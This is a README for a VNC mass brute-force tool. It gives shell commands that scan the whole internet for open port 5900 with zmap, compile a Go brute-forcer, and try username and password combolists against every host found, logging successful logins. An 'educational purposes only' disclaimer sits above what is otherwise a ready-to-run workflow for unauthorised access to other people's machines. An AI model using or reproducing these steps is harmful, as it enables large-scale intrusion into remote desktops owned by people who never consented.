# VNC-mass-bruteforcer
Disclamer: this is intended for educational purposes only, and it is also protected by the Digital Millennium Copyright Act (DMCA)
mass bruteforce vnc servers with  iplist and user:pass combolist

Instructions:

  ------------------------------------------------
    Make a sh file named auto.sh and paste the below data
    this will scan the world to bruteforce with cmd:
                     "sh auto.sh"
    This will result in a full world scan and echo the results to the screen.
    results file : /bruteforced.log
    login file : /passwords.txt
                          ||
                          \/
  -------------------------------------------------
    echo "rm -rf bios.txt mfu.txt
    ulimit -n 999999
    zmap -p5900 -N170000 -obios.txt
    python add_port.py bios.txt mfu.txt 5900
    ./vnc_brute passwords.txt mfu.txt
    awk {'print $0; system("sleep 0.003"'} bruteforced.log" > auto.sh
  -------------------------------------------------
FIRST TIME INSTRUCTIONS: 

  -----------------------------------------------------
  COMPILE THE BRUTER
    go env -w GO111MODULE=off
    go get github.com/kward/go-vnc
    go build vnc_brute.go
  -----------------------------------------------------
  SCAN FOR IP RANGES
    zmap -p5900 -N150000 -ovnc_mfu_unfilt.txt
  -----------------------------------------------------
  ADD PORT NUMBER
    python add_port.py vnc_mfu_unfilt.txt vnc_mfu.txt 5900
  -----------------------------------------------------
  START BRUTEFORCE
    ./vnc_brute passwords.txt vnc_mfu.txt

